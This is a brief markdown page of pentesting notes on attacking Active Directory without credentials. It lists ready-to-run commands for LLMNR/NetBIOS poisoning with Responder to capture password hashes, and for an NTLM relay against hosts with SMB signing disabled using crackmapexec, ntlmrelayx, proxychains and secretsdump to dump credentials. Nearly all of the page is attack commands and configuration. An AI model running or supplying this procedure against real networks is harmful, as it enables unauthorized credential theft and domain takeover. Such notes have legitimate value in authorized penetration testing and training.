---
title: AD Attacks
category: Active Directory
order: 2
---

# Without Credentials

## LLMNR / NetBIOS Poisoning

We can grab some hashed credentials if LLMNR protocol is enabled.

```
sudo responder -I eth0 -Fw
```

After some time we can get all the hashes.

```
cd /usr/share/responder
sudo python DumpHash.py
```

## NTLM Relay (SMB signing disabled)

Some tiems some server are misconfigured and have the smb signing disabled, so we can perform more attacks with responder.

### Configuration

* /etc/proxychains4.conf

```
socks4  127.0.0.1       1080
```

* /usr/share/responder/Responder.conf

```
[Responder Core]

; Servers to start
SMB = Off
HTTP = On
```

### Perform the attack

We need to get a list of the servers with the SMB sigining disabled.

```
crackmapexec smb --gen-relay-list vulnerable_servers.txt 10.10.10.0/24
```

Execute the attack with Responder and Impacket.

```
impacket-ntlmrelayx.py -tf ./vulnerable_servers.txt -socks -smb2support
sudo responder -I eth0
```

We can list the current sessions with the next command.

```
ntlmrelayx> socks
```

When a session with administrative privileges is found we can use secretsdump or other tool with proxychains to use the session captured.

```
proxychains impacket-secretdump DOMAIN/admin@IP
```
